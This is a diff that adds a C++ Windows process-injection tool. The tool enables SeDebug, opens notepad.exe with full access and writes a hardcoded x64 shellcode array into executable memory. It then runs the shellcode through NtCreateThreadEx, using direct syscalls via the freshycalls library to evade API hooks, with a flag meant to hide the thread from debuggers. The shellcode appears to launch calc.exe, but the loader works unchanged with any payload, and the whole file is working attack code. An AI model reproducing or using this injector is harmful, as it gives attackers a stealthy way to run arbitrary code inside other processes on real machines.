@@ -1,0 +1,295 @@
+#include "syscall.hpp"
+#include <iostream>
+#include <string>
+#include <cstdint>
+#include <Windows.h>
+#include <winternl.h>
+#include "processsnapshot.h"
+#include <DbgHelp.h>
+#include<TlHelp32.h>
+#pragma comment (lib, "Dbghelp.lib")
+
+using namespace std;
+
+static auto& syscall = freshycalls::Syscall::get_instance();
+
+
+// notedpad pid research
+DWORD FindPidByName(LPCWSTR processName) {
+	DWORD foundpid = 0;
+	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hSnapshot == INVALID_HANDLE_VALUE) {
+		return foundpid;
+	}
+
+	PROCESSENTRY32 pe;
+	pe.dwSize = sizeof(PROCESSENTRY32);
+
+	if (Process32First(hSnapshot, &pe)) {
+		do {
+			if (_wcsicmp(processName, pe.szExeFile) == 0) {
+				foundpid = pe.th32ProcessID;
+				break;
+			}
+		} while (Process32Next(hSnapshot, &pe));
+	}
+
+	CloseHandle(hSnapshot);
+	return foundpid;
+}
+
+void ActivateSeDebug() {
+	HANDLE token_handle{};
+	TOKEN_PRIVILEGES token_privileges{};
+
+	syscall.CallSyscall("NtOpenProcessToken", HANDLE(-1), TOKEN_ADJUST_PRIVILEGES, &token_handle)
+		.OrDie("[ActiveSeDebug] An error happened while opening the current process token: \"{{result_msg}}\" (Error Code: {{result_as_hex}})");
+
+	token_privileges.PrivilegeCount = 1;
+	// SeDebug's LUID low part == 20
+	token_privileges.Privileges[0].Luid = { 20L, 0 };
+	token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+	syscall.CallSyscall("NtAdjustPrivilegesToken", token_handle, false, &token_privileges, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr)
+		.OrDie("[ActiveSeDebug] An error happened while activating SeDebug on current token: \"{{result_msg}}\" (Error Code: {{result_as_hex}})");
+
+	CloseHandle(token_handle);
+}
+
+HANDLE OpenProcess( DWORD process_id) {
+	HANDLE process_handle{};
+	OBJECT_ATTRIBUTES obj{};
+
+	InitializeObjectAttributes(&obj, nullptr, 0, nullptr, nullptr);
+	CLIENT_ID client = { (HANDLE)(process_id), nullptr };
+
+	syscall.CallSyscall("NtOpenProcess",
+		&process_handle,
+		PROCESS_ALL_ACCESS,
+		&obj,
+		&client)
+		.OrDie("[OpenProcess] An error happened while opening the target process: \"{{result_msg}}\" (Error Code: {{result_as_hex}})");
+
+	return process_handle;
+}
+
+std::wstring StrToWStr(std::string_view str) {
+	int no_chars = MultiByteToWideChar(CP_UTF8, 0, str.data(), str.length(), nullptr, 0);
+	std::wstring wstr(no_chars, 0);
+	MultiByteToWideChar(CP_UTF8, 0, str.data(), str.length(), LPWSTR(wstr.data()), no_chars);
+	return wstr;
+}
+
+//HANDLE CreateDumpFile(std::string_view file_path) {
+//	HANDLE file_handle{};
+//	IO_STATUS_BLOCK isb{};
+//	OBJECT_ATTRIBUTES obj{};
+//	UNICODE_STRING ntpath{};
+//
+//	using FunctionDef = bool(__stdcall*)(PCWSTR, PUNICODE_STRING, PCWSTR*, VOID*);
+//	FunctionDef RtlDosPathNameToNtPathName_U =
+//		reinterpret_cast<decltype(RtlDosPathNameToNtPathName_U)>(GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlDosPathNameToNtPathName_U"));
+//
+//	bool status = RtlDosPathNameToNtPathName_U(StrToWStr(file_path).data(), &ntpath, nullptr, nullptr);
+//	if (!status) {
+//		throw std::runtime_error(freshycalls::utils::FormatString("[CreateDumpFile] RtlDosPathNameToNtPathName_U failed: \"%s\" (Error Code: %ld)",
+//			freshycalls::utils::GetErrorMessage(GetLastError()).data(),
+//			GetLastError()));
+//	}
+//
+//	InitializeObjectAttributes(&obj, &ntpath, OBJ_CASE_INSENSITIVE, nullptr, nullptr);
+//
+//	syscall.CallSyscall("NtCreateFile", &file_handle,
+//		FILE_GENERIC_WRITE,
+//		&obj,
+//		&isb,
+//		nullptr,
+//		FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF,
+//		FILE_RANDOM_ACCESS | FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
+//		nullptr,
+//		0)
+//		.OrDie("[CreateDumpFile] An error happened while creating the dump file (Error Code: {{result_as_hex}})");
+//
+//	return file_handle;
+//}
+
+//void WriteToDumpFile(HANDLE file_handle, const void* data, SIZE_T size) {
+//	IO_STATUS_BLOCK isb{};
+//	syscall.CallSyscall("NtWriteFile",
+//		file_handle,
+//		nullptr,
+//		nullptr,
+//		nullptr,
+//		&isb,
+//		const_cast<void*>(data),
+//		static_cast<ULONG>(size),
+//		nullptr,
+//		nullptr)
+//		.OrDie("[WriteToDumpFile] Failed to write to dump file (Error Code: {{result_as_hex}})");
+//}
+
+
+
+int main(int argc, char* argv[]) {
+
+	//const char payload[] =
+	//	"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
+	//	"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
+	//	"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
+	//	"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
+	//	"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
+	//	"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
+	//	"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
+	//	"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
+	//	"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
+	//	"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+	//	"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
+	//	"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
+	//	"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
+	//	"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
+	//	"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
+	//	"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
+	//	"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+	//	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+	//	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+	//	"\xd5";
+
+	const char payload[] =
+		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
+		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
+		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
+		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
+		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
+		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
+		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
+		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
+		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
+		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
+		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
+		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
+		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
+		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
+		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
+		"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
+
+	DWORD pid = 0;
+	const wchar_t* processName = L"notepad.exe";
+
+	pid = FindPidByName(processName);
+	if (pid == 0) {
+		printf("[ERROR] Failed to obtain process ID!\n");
+		return -1;
+	}
+
+	HANDLE process_handle;
+	NTSTATUS codestatus;
+	LPVOID lpAllocationStart = NULL;
+
+	std::cout << "[+] Trying to activate SeDebug...";
+	ActivateSeDebug();
+	std::cout << " OK!" << std::endl;
+	system("pause");
+	std::cout << "[+] Trying to open the process (PID: " << pid << ")...";
+	process_handle = OpenProcess(pid);
+	std::cout << " OK!" << std::endl;
+	system("pause");
+
+	std::cout << "[+] Trying to allocate memory ...";
+	//codestatus = VirtualAllocatEx(process_handle,payload,&lpAllocationStart);
+	HANDLE hThread = NULL;
+	SIZE_T szAllocationSize = sizeof(payload);
+
+	 syscall.CallSyscall("NtAllocateVirtualMemory",
+		process_handle,
+		&lpAllocationStart,
+		0,
+		&szAllocationSize,
+		MEM_COMMIT | MEM_RESERVE,
+		PAGE_EXECUTE_READWRITE)
+		.OrDie("[OpenProcess] An error happened while allocating memory: \"{{result_msg}}\" (Error Code: {{result_as_hex}})");
+	std::cout << " OK!" << std::endl;
+	std::cout << "Alloc address: " << lpAllocationStart <<" "<< std::endl;
+
+	system("pause");
+
+	std::cout << "[+] Trying to write in the memory ...";
+	//	NTSTATUS writestatus = NtWritenVirtualMemory(phandle, lpAllocationStart, (PVOID)payload, sizeof(payload), nullptr);
+
+	try {
+		syscall.CallSyscall("NtWriteVirtualMemory",
+			process_handle,
+			lpAllocationStart,
+			(PVOID)payload,
+			sizeof(payload),
+			nullptr
+		)
+			.OrDie("[OpenProcess] An error happened while writing in the memory: \"{{result_msg}}\" (Error Code: {{result_as_hex}})");
+		std::cout << " OK!" << std::endl;
+		system("pause");
+	}
+	catch (const std::runtime_error& ex) {
+		std::cout << ex.what() << std::endl;
+		return -1;
+	}
+
+
+	/*std::cout << "[+] Creating dump file...";
+	HANDLE dumpFile = CreateDumpFile(argv[3]);
+	WriteToDumpFile(dumpFile, payload, sizeof(payload));
+	CloseHandle(dumpFile);
+	std::cout << "OK!" << std::endl;*/
+	BOOL isWow64 = FALSE;
+	IsWow64Process(process_handle, &isWow64);
+	std::cout << "[+] Target process is " << (isWow64 ? "32-bit" : "64-bit") << std::endl;
+
+
+	std::cout << "[+] Trying to create the remote thread ...";
+	//NTSTATUS threadstatus = NtCreatedThreadEx(&hThread, GENERIC_EXECUTE, NULL, phandle, lpAllocationStart, NULL, FALSE, 0, 0, 0, nullptr);
+	ULONG flags = 0x00000004; // THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER (optionnel)
+	syscall.CallSyscall("NtCreateThreadEx",
+		&hThread,
+		GENERIC_EXECUTE,
+		(int64_t)NULL,
+		process_handle,
+		lpAllocationStart,
+		(int64_t)NULL,
+		(int64_t)0,
+		(int64_t)0,
+		(int64_t)0,
+		(int64_t)0,
+		(int64_t)NULL)
+		.OrDie("[NtCreateThreadEx] Failed to create thread: {{result_as_hex}} - {{result_msg}}");
+
+
+	//unsigned int result = syscall.CallSyscall("NtCreateThreadEx",
+	//	&hThread,
+	//	GENERIC_EXECUTE,
+	//	NULL,
+	//	process_handle,
+	//	lpAllocationStart,
+	//	NULL,
+	//	FALSE,
+	//	0,
+	//	0, 
+	//	0,
+	//	nullptr
+	//);
+
+	 //Cast explicite en NTSTATUS
+	//LONG status = static_cast<LONG>(result);
+
+	// //Vérifie si le syscall a échoué
+	//if ((status & 0x80000000) != 0) { // bit de statut d'erreur
+	//	std::cerr << "[ERROR] NtCreateThreadEx failed with NTSTATUS: 0x"
+	//		<< std::hex << status << std::endl;
+	//	return -1;
+	//}
+	
+	std::cout << "process injection completed ! " << std::endl;
+
+	return 0;
+}
